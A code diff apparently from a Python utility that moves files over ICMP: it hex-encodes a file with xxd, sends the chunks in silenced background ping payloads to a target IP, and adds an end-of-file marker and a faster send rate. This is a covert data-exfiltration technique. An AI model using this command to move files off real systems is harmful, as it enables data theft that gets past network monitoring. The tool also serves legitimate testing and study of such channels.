@@ -75,10 +75,19 @@ def data_parser(packet_info):
             # Avoid ICMP normal ping packets.
             if "4567" in byte_data:
                 byte_data = str(byte_data).replace("4567", "")
+
+            if "FI" in byte_data:
+                byte_data = str(byte_data).replace("FI", "")
+                print(f"\n\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
+                      f"{Fore.BLUE + '  File received successfully'}")
+                exit()
+
             print(byte_data, flush=True, end='')
             a = open(f'{sys.argv[6]}.txt', 'a')
             a.write(byte_data)
+
             a.close()
+
 
 
 def send_file(ip_address, file_name):
@@ -89,7 +98,7 @@ def send_file(ip_address, file_name):
               f"{Fore.RED + ' Indicate file dosent exist, check file name.'}")
         print(Fore.WHITE)  # To avoid leaving the terminal with colours.
         exit()
-    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .001s; done >/dev/null 2>&1 &"""
+    file_load = f"""xxd -p -c 4 {file_name} | while read line; do ping -c 1 -p $line {ip_address}; sleep .0002s; done >/dev/null 2>&1 &"""
     print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
           f"{Fore.BLUE + '  Trying to send file..'}")
     subprocess.run([file_load], shell=True)
@@ -99,10 +108,15 @@ def send_file(ip_address, file_name):
         progess_bar = 0
         print()
         for i in tqdm(range(int(calc_progress_bar))):
-            time.sleep(.1)
+            time.sleep(.03)
             progess_bar += i
     print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
           f"{Fore.BLUE + '  File sent successfully'}")
+    # Send exit msg
+    time.sleep(1)
+    exit_text = "FI".encode().hex()
+    send_exit_msg = f"""ping -c 1 -p {exit_text} {ip_address} """
+    subprocess.run([send_exit_msg], shell=True, stdout=subprocess.DEVNULL)
     print(Fore.WHITE)
 
 
